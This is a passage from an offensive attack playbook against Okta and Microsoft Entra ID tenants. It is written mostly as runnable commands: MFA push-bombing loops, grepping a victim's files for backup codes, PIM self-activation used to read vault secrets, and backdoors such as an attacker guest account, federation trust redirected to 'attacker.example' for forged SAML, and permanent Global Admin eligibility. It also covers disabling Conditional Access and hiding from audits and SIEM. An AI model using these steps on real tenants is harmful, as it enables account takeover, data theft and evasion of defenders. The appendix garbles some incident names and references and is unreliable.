  curl -s -X POST "https://corp.okta.com/api/v1/authn" \
    -H "Content-Type: application/json" \
    -d '{"username":"victim@corp.com"}' &
done; wait

# Microsoft: trigger via /common/SAS endpoint
# (Microsoft has added number-matching in 2023, mitigating this)
```

### 13.2 SIM swap

```bash
# Out of band — requires social engineering of the carrier
# Detect SMS-based MFA (which is vulnerable) by:
# 1. Trigger a login that requires MFA
# 2. Inspect the response — if "codeType":"sms" or "phoneMethod", SMS is used
# 3. SIM swap via carrier fraud → intercept SMS

# Mitigation: enable FIDO2 / Authenticator app / push (number-matched)
```

### 13.3 Backup code leak

```bash
# Many IdPs issue backup codes for MFA recovery
# These are often stored in:
# - Plaintext notes (Keepass with weak master)
# - Email drafts (search for "backup code")
# - Browser bookmarks

# Once you have file/email access, search:
grep -r -i 'backup code\|recovery code\|mfa code' /home/victim
grep -r -i 'backup\|recovery' /home/victim/.config
```

### 13.4 OAuth-app-level bypass

```bash
# TokenTactics: get a token for a high-priv Microsoft first-party app
# The token was issued to a *trusted* app — IdP doesn't re-challenge MFA
python tokenTactics.py get-token --client outlook --tenant corp.com
# Use the resulting token against Outlook — no MFA challenge because
# the original consent already had MFA
```

---

## 14. JIT Access (PIM) Exploitation

### 14.1 Enumerate PIM eligibility

```bash
# Find roles you're eligible to activate
USER_ID=$(az ad signed-in-user show --query id -o tsv)

az rest --method get \
  --url "https://management.azure.com/providers/Microsoft.Authorization/roleEligibilitySchedules?api-version=2020-10-01&\$filter=principalId eq '$USER_ID'" \
  --query 'value[].{Role:properties.roleDefinitionId,Scope:properties.scope}'

# Or via Microsoft Graph for directory roles
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules?\$filter=principalId eq '$USER_ID'"
```

### 14.2 Activate a role (PIM)

```bash
# Self-activate a PIM-eligible role
az rest --method post \
  --url "https://management.azure.com/providers/Microsoft.Authorization/roleAssignmentScheduleRequests?api-version=2020-10-01" \
  --body '{
    "properties": {
      "PrincipalId": "<your-id>",
      "RoleDefinitionId": "<role-def-id>",
      "RequestType": "SelfActivate",
      "ScheduleInfo": {
        "StartDateTime": "2026-06-17T12:00:00Z",
        "Expiration": {
          "Type": "AfterDuration",
          "Duration": "PT4H"
        }
      },
      "Justification": "Incident response - approved in #ir-channel"
    }
  }'

# If the role has approval required, the request goes to approvers
# If self-approval is allowed (common misconfig), activation is instant
```

### 14.3 Use the elevated role briefly

```bash
# Once activated, use the elevated role for the activation window
az role assignment list --role "Owner" --all
az keyvault secret show --vault-name corp-kv --name admin-password

# Deactivate (or let it expire)
az rest --method post \
  --url "https://management.azure.com/providers/Microsoft.Authorization/roleAssignmentScheduleRequests?api-version=2020-10-01" \
  --body '{"properties":{"PrincipalId":"<id>","RoleDefinitionId":"<role>","RequestType":"SelfDeactivate"}}'
```

---

## 15. Persistence Techniques

### 15.1 Backdoor app registration (covered in §8.2)

```bash
# Create an app with broad permissions, consent as Global Admin
# Persists across password resets and user deletions
# See §8.2 for full procedure
```

### 15.2 Guest user backdoor

```bash
# Invite an attacker-controlled account as a guest
# Add to a privileged group
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/invitations" \
  --body '{
    "invitedUserEmailAddress": "attacker@evil.example",
    "inviteRedirectUrl": "https://myapps.microsoft.com",
    "sendInvitationMessage": false
  }'

# Get the guest user's ID
GUEST_ID=$(az rest --method get \
  --url "https://graph.microsoft.com/v1./users/attacker_evil.example%23EXT%23@corponmicrosoft.com" \
  --query id -o tsv)

# Add guest to a privileged group (requires Group Admin)
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/groups/<ga-group-id>/members/\$ref" \
  --body "{\"@odata.id\":\"https://graph.microsoft.com/v1.0/directoryObjects/$GUEST_ID\"}"
```

### 15.3 Federation trust tampering

```powershell
Import-Module AADInternals

# Add a new SAML federation trust pointing to attacker-controlled IdP
Set-AADIntDomainFederation -DomainName 'corp.com' `
  -IssuerUri 'http://adfs.corp.com/adfs/services/trust' `
  -ActiveLogOnUri 'https://attacker.example/adfs/services/trust/2005/usernamemixed' `
  -PassiveLogOnUri 'https://attacker.example/adfs/ls' `
  -SigningCertificate (Get-Content attacker-signing.cer -Raw) `
  -MetadataUrl 'https://attacker.example/FederationMetadata/2007-06/FederationMetadata.xml'

# Future sign-ins to corp.com redirect to attacker.example
# Attacker forges SAML on demand — survives tenant admin password reset
```

### 15.4 PIM-eligible elevation persistence

```bash
# Grant a low-priv user PIM eligibility for Global Administrator
# Persists as "eligible" — only triggers audit when activated
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleRequests" \
  --body '{
    "action": "AdminAssign",
    "principalId": "<your-low-priv-id>",
    "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
    "directoryScopeId": "/",
    "appScopeId": null,
    "justification": "Backup admin",
    "scheduleInfo": {
      "startDateTime": "2026-06-17T00:00:00Z",
      "expiration": {
        "type": "NoExpiration"
      }
    }
  }'
# Role 62e90394-... = Global Administrator
# Now you're eligible to activate Global Admin whenever needed
```

### 15.5 Conditional Access policy modification

```bash
# Add an exclusion for attacker IP / user / app to existing CA policies
# Or disable a CA policy briefly
az rest --method patch \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies/<policy-id>" \
  --body '{
    "state": "disabled"
  }'
# Persists until defenders re-enable — useful for short windows
```

---

## 16. Anti-Forensics / Detection Evasion

### 16.1 Audit log minimization

```bash
# Limit Graph API calls — each call generates an audit entry
# Use efficient queries ($select, $filter) to reduce call volume

# Use refresh tokens instead of re-authenticating — fewer interactive sign-ins
# (Entra ID logs interactive + non-interactive separately; non-interactive is less monitored)

# Space out actions — burst activity triggers UEBA alerts
```

### 16.2 App-only auth (client credentials)

```bash
# Service principal authentication creates different audit entries than user auth
# Defenders often monitor user-based sign-ins more aggressively
# Use app-only auth where possible (backdoor apps in §8.2, §15.1)
```

### 16.3 Token scope minimization

```bash
# A token with `Mail.Read` triggers different alerts than `Mail.ReadWrite`
# Use the minimal scope needed
# Avoid `.ReadWrite` and `.All` scopes unless necessary
```

### 16.4 Audit log cleanup (defender note)

```bash
# Once you have Global Admin, you cannot delete audit logs in Entra ID
# Logs are immutable for compliance — but you can:
# - Reduce log retention (if not locked by retention policy)
# - Disable audit log streaming to SIEM
# - Modify alert rules to ignore your activity

# (Detection: defender should monitor for retention policy changes and SIEM disconnections)
```

---

## Appendix: Incident Reference

### SolarWinds / SUNBURST (Dec 2020)
- **TTP**: Golden SAML via AD FS token-signing cert theft
- **Impact**: Mail reading at US Treasury, DHS CISA, others
- **Tool**: Custom (FireEye red team tooling leaked)
- **Reference**: CISA AA21-008A

### Nobelji / NOBELIUM (Mar 2021)
- **TTP**: Illicit consent grant via malicious OAuth app "Mango Sandstorm"
- **Impact**: Email access at US government agencies
- **Tool**: Custom OAuth consent abuse
- **Reference**: CISA AA21-008A, Microsoft MSTIC blog

### LAPSUS$ (Dec 2021 - Sep 2022)
- **TTP**: MFA fatigue / push-bombing on Okta, Cisco, Microsoft, NVIDIA, Uber
- **Impact**: Source code theft, infrastructure compromise
- **Tool**: Manual auth flow triggers + Telegram for token sales
- **Reference**: CISA AA22-040A

### Uber (Sep 2022)
- **TTP**: MFA fatigue on Uber admin → access to AWS, SentinelOne, Thycotic
- **Impact**: Source code, secret vault, customer data
- **Tool**: MFA push-bombing
- **Reference**: Uber security update, CISA alert
